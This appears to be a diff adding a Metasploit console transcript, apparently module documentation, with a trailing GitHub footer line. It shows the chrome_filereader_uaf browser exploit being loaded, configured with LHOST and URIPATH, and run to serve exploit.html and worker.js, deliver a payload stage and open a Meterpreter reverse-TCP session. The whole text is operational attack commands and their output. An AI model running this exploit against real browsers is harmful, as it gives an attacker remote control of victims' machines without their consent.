@@ -1,0 +1,17 @@
+msf5 > use exploit/windows/browser/chrome_filereader_uaf
+msf5 exploit(windows/browser/chrome_filereader_uaf) > set URIPATH /
+URIPATH => /
+msf5 exploit(windows/browser/chrome_filereader_uaf) > set LHOST 192.168.0.1
+LHOST => 192.168.0.1
+msf5 exploit(windows/browser/chrome_filereader_uaf) > run
+[*] Started reverse TCP handler on 192.168.0.1:4444
+[*] Using URL: http://0.0.0.0:8080/
+[*] Local IP: http://192.168.0.1:8080/
+[*] Server started.
+[*] 192.168.0.1   chrome_filereader_uaf - Sending /
+[*] 192.168.0.1   chrome_filereader_uaf - Sending /favicon.ico
+[*] 192.168.0.1   chrome_filereader_uaf - Sending /exploit.html
+[*] 192.168.0.1   chrome_filereader_uaf - Sending /worker.js
+[*] Sending stage (179779 bytes) to 192.168.0.1
+[*] Meterpreter session 1 opened (192.168.0.1:4444 -> 192.168.0.1:60876) at 2019-05-06 16:49:06 +0800
+© 2020 GitHub, Inc.
